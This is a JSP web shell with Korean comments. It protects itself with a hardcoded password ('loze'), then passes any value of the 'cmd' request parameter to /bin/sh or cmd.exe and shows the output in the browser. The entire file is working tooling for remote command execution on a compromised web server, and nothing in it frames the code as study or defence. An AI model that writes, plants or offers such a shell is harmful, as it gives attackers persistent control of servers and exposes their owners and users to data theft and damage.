<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%
	String cmd = request.getParameter("cmd");
	Process ps = null;
	BufferedReader br = null;
	String line = "";
	String result = "";
	String now_page = request.getServletPath();
	String password = "loze";
	String input_password = request.getParameter("password");
	String id = (String)session.getAttribute("webshell_id");
	String os = System.getProperty("os.name").toLowerCase();
	String shell = "";
	
	try {
		if(id == null && input_password == null) {
			%>
			<form action="<%=now_page%>" method="POST">
			<input type="password" name="password">
			<input type="submit" value="AUTH">
			<form>
			<%
			return;
		} else if(id == null && input_password != null){
			if(password.equals(input_password)) {
				session.setAttribute("webshell_id", "loze");
				response.sendRedirect(now_page);
			} else {
				response.sendRedirect(now_page);
			}
		}
		
		if(os.indexOf("win") == -1){
			//Windows가 아닐 경우 
			shell = "/bin/sh -c ";
		} else {
			shell = "cmd.exe /c";
		}
			
		
		if(cmd != null) {
			ps = Runtime.getRuntime().exec(shell + cmd);
			// 바이트 스트림 > 문자 스트림 > 버퍼 저장 
			br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
			
			while((line = br.readLine()) != null) {
				result += line + "<br>";
			}
			ps.destroy();
		}
		
		
	} finally {
		if(br != null) br.close();
	}
%>

<form action="<%=now_page%>" method="POST">
<input type="text" name="cmd">
<input type="submit" value="EXECUTE">
</form>
<hr>
<% if(cmd != null) {%>
<table style="border: 1px solid black; background-color: black">
<tr>
	<td style="color: white; font-size: 12px"><%=result%></td>
</tr>
</table>
<% } %>